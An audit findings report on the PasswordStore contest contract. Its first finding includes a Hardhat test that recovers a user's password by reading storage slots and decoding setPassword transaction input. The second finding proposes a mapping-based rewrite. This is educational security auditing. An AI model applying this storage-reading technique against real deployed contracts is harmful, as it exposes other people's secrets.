# First Flight #1: PasswordStore - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. Do NOT store secrets on a blockchain - the password will be compromised and all relevant projects hacked](#H-01)
    - ### [H-02. s_password should be a mapping - doesn't allow users to have their password be stored separately](#H-02)




# <a id='contest-summary'></a>Contest Summary

### Sponsor: First Flight #1

### Dates: Oct 18th, 2023 - Oct 25th, 2023

[See more contest details here](https://www.codehawks.com/contests/clnuo221v0001l50aomgo4nyn)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 2
   - Medium: 0
   - Low: 0


# High Risk Findings

## <a id='H-01'></a>H-01. Do NOT store secrets on a blockchain - the password will be compromised and all relevant projects hacked            



## Summary

Anyone can read storage slots of a deployed contract OR decode input params of a transaction that called setPassword() function. You cannot store any secrets on a blockchain.

## Vulnerability Details

Storage slots of a smart contract can be easily read, so can be input params of a sent transaction. A password stored in a storage variable ( or that was sent as an input ) will be compromised.

## Impact
Passwords will be compromised and all the relevant projects hacked. The proof test case:

```
import { expect } from 'chai';
import { ethers } from 'hardhat';
import { Transaction } from 'ethers';

const { provider, deployContract, getSigners, keccak256, AbiCoder, concat, decodeBytes32String, dataSlice } = ethers;

describe('passwordStore', function () {
	it('We should retreive password from the storage', async () => {
		const [deployer, user1] = await getSigners();

		const password = 'mySecretPassword';

		const contract = await deployContract('PasswordStore');
		await contract.connect(user1).setPassword(password); // user1 sets the password

		// now we'll read it from the storage
		// getting the hashed slot for out private password mapping
		const slot = keccak256(
			concat([AbiCoder.defaultAbiCoder().encode(['address'], [user1.address]), AbiCoder.defaultAbiCoder().encode(['uint256'], [0])])
		);
		// reading the slot
		const fetchedBytes = await provider.getStorage(contract.target, slot);
		// decoding it to a string
		const decodedPassword = decodeBytes32String(fetchedBytes.slice(0, -2) + '00');
		// aaaand....
		console.log('DRUM ROLL..... THE DECODED PASSWORD IS:', decodedPassword);

		// passwords match, we have the user1's password
		expect(decodedPassword).equals(password);
	});

	it('We should get the password from the tx input', async () => {
		const [deployer, user1] = await getSigners();

		const password = 'mySecretPassword';

		const contract = await deployContract('PasswordStore');
		await contract.connect(user1).setPassword(password); // user1 sets the password

		// getting all txs from the latest block
		const { transactions } = await provider.send('eth_getBlockByNumber', ['latest', true]);

		// finding the needed tx where user set the password
		const neededTx = transactions.find((tx: Transaction) => tx.to!.toLowerCase() === contract.target.toString().toLowerCase());

		// optional, if we don't know the type of the input
		const functionSig = dataSlice(neededTx?.input!, 0, 4);
		const res = await (await fetch(`https://api.openchain.xyz/signature-database/v1/lookup?filter=false&function=${functionSig}`)).json();
		const decodedFuncSig = res.result.function[functionSig][0].name;
		console.log('Function sig:', decodedFuncSig); // setPassword(string)

		// decoding the input
		const decodedFuncInput = AbiCoder.defaultAbiCoder().decode(['string'], dataSlice(neededTx!.input, 4));
		// looking at it
		console.log('Function input:', decodedFuncInput[0]); // voila, it's a match

		// passwords match, we compromised user1 password again
		expect(decodedFuncInput[0]).equals(password);
	});
});
```
The tests pass, passwords match in both cases, we were able to get the user1 password by slot reading and by decoding his setPassword tx...

## Tools Used
hardhat, ethers.js

## Recommendations

Do not store secrets on a blockchain, store them hashed on some secured centralized server, for example
## <a id='H-02'></a>H-02. s_password should be a mapping - doesn't allow users to have their password be stored separately            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L14

https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L27

https://github.com/Cyfrin/2023-10-PasswordStore/blob/856ed94bfcf1031bf9d13514cb21b591d88ed323/src/PasswordStore.sol#L36-L39

## Summary

The docs says that a user should be able to store a password, so we need a PRIVATE ( for it not to be accessible publicly ) mapping for that, not a single string variable. Also we need to change both functions to work with the mapping.

## Vulnerability Details

We cannot use a single string to store a password for muplitple accounts.

## Impact

The contract won't work as intended by the developers.

## Tools Used
hardhat

## Recommendations
I'll paste the whole new contract so it will be clearer

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/*
 * @author not-so-secure-dev
 * @title PasswordStore
 * @notice This contract allows you to store a private password that others won't be able to see.
 * You can update your password at any time.
 */
contract PasswordStore {
    error PasswordStore__NotOwner();

    address private immutable s_owner;
@>  mapping(address => string) private s_passwords; // a mapping instead of a string

    event SetNetPassword();

    constructor() {
        s_owner = msg.sender;
    }

    /**
     * @notice This function allows a user to set a new password.
     * @param newPassword The new password to set.
     */
    function setPassword(string memory newPassword) external {
@>      s_passwords[msg.sender] = newPassword;

        emit SetNetPassword();
    }

    /**
     * @notice This allows only the user to retrieve his password.
     */
    function getPassword() external view returns (string memory) {
@>      require(bytes(s_passwords[msg.sender]).length > 0, "You haven't stored a password"); // check if the user has stored a password

@>   return s_passwords[msg.sender];
    }
}

```
		





